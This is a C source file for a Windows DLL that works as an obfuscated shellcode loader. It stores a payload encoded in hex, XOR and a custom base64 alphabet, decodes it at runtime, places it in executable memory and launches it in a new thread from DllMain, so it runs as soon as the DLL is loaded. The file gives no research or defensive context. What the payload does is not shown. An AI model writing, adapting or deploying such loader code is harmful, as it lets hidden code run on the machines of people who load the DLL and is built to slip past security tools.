#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char* encrypted_shellcode = "85fcd8f39fe1fd85858585c6cbf0f0f0f0fcffe3e0eff3e2e2fdf9e2eceeeff8d893fbdee2f8cde2feffebf8d893f8dee2f0819de2dac1f8d89dfbe0ededf9fbe2fdf9f0c3fdc9d9dff0f8c2f8fcf9f3c8e093f3f0d2f9d899effbf8d893f8ded89af898e2f0f9e0e0efffc4dee9dee8f2cef8e1d9e9f8f0f0f0f2e5def8def0f0f0f3f8d9d2f39aeb9adef39afce2e5e0f2f3fbf0ddf2e5e2f3d9e09c93ebe7e4d2c5f88598c5f3d8cbe2f8e2f0f9eee2fdf9f0e0d2f9fbfdd0c9f3f0d2fc9c9cf9e9c9edf0e7e4fbf0d9ffe6ddff9392ffd9fcd89af0dae2e0f9e0ebdafee5fdfcd9fcd89af0d2e2e0f9e0e0e8c2fcd8fcffe8e2f0f9e0e0efd9dceeefc1f3eefcffebe0efc1f8de81cedee0efe5859cffd9f3eeefc1f8d8c9e5c1e285858585939dc6f2cef0f0f0f9efcbebe9f8cbe4d89fdad3fecef0eeecfe9eedf9d2c4f38585efe2d2dff3e0f0f0f0f0e6defdf0f0f0f0eefce0f0eeccdefdf0f0f0f0eefce0f0e0efd9f8e4d2c5f3ccdaeefdefdedf8593ecdec9c8ecfe9e98e5eed8efcf85ef";

const char* base64_chars = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0987654321+/";

int is_base64(unsigned char c) {
    return (strchr(base64_chars, c) != NULL);
}

int base64_decode(const char* input, unsigned char* output) {
    int len = strlen(input);
    int i = 0, j = 0;
    unsigned char char_array_4[4], char_array_3[3];
    int output_len = 0;

    while (len-- && (input[i] != '=') && is_base64(input[i])) {
        char_array_4[j++] = input[i]; i++;
        if (j == 4) {
            for (j = 0; j < 4; j++) {
                char_array_4[j] = (unsigned char)(strchr(base64_chars, char_array_4[j]) - base64_chars);
            }
            char_array_3[0] = (char_array_4[0] << 2) | (char_array_4[1] >> 4);
            char_array_3[1] = ((char_array_4[1] & 15) << 4) | (char_array_4[2] >> 2);
            char_array_3[2] = ((char_array_4[2] & 3) << 6) | char_array_4[3];

            for (j = 0; j < 3; j++) {
                output[output_len++] = char_array_3[j];
            }
            j = 0;
        }
    }
    return output_len;
}

int hex_decode(const char* hex, unsigned char* output) {
    int len = strlen(hex);
    if (len % 2 != 0) return 0;
    for (int i = 0; i < len; i += 2) {
        sscanf_s(hex + i, "%2hhx", &output[i / 2], 2);
    }
    return len / 2;
}

void xor_decrypt(unsigned char* data, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

int decode_shellcode(const char* input, unsigned char** output_ptr) {
    int hex_len = strlen(input) / 2;
    unsigned char* decoded_hex = (unsigned char*)malloc(hex_len + 1);
    if (!decoded_hex) return 0;

    int decoded_len = hex_decode(input, decoded_hex);
    if (decoded_len == 0) {
        free(decoded_hex);
        return 0;
    }

    xor_decrypt(decoded_hex, decoded_len, 0xAA);
    decoded_hex[decoded_len] = '\0';

    unsigned char* shellcode = (unsigned char*)malloc(decoded_len);
    if (!shellcode) {
        free(decoded_hex);
        return 0;
    }

    int shellcode_len = base64_decode((char*)decoded_hex, shellcode);

    free(decoded_hex);

    if (shellcode_len == 0) {
        free(shellcode);
        return 0;
    }

    *output_ptr = shellcode;
    return shellcode_len;
}

void ExecuteShellcode0() {
    unsigned char* shellcode;
    int shellcode_len = decode_shellcode(encrypted_shellcode, &shellcode);
    if (shellcode_len == 0) return;

    LPVOID execMem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        free(shellcode);
        return;
    }

    memcpy(execMem, shellcode, shellcode_len);
    free(shellcode);

    DWORD oldProtect;
    VirtualProtect(execMem, shellcode_len, PAGE_EXECUTE_READWRITE, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (hThread == NULL) {
        MessageBoxA(NULL, "Thread creation failed", "Error", MB_OK);
        VirtualFree(execMem, 0, MEM_RELEASE);
    }
    else {
        CloseHandle(hThread);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        ExecuteShellcode0();
        break;
    }
    return TRUE;
}
